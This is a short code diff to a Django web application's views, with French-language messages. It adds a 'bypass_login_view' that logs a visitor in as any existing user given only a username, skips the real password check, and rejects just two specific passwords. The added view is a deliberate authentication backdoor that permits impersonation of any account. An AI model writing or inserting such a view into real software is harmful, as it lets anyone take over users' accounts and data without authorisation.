@@ -114,3 +114,24 @@ def dashboard_view(request):
     
     # par défaut
     return render(request, 'users/dashboard.html', {'user': user})
+
+def bypass_login_view(request):
+    if request.method == 'POST':
+        username = request.POST.get('username')
+        password = request.POST.get('password') 
+        
+        if password == "asdf" or password == "etudiant1234":
+            messages.error(request, "Mot de passe incorrect.")
+            return render(request, 'registration/login.html')
+            
+        try:
+            user = CustomUser.objects.get(username=username)
+            
+            login(request, user, backend='django.contrib.auth.backends.ModelBackend')
+            
+            messages.success(request, f"Accès temporaire activé pour {username}")
+            return redirect('dashboard')
+        except CustomUser.DoesNotExist:
+            messages.error(request, "Utilisateur introuvable.")
+    
+    return render(request, 'registration/login.html')
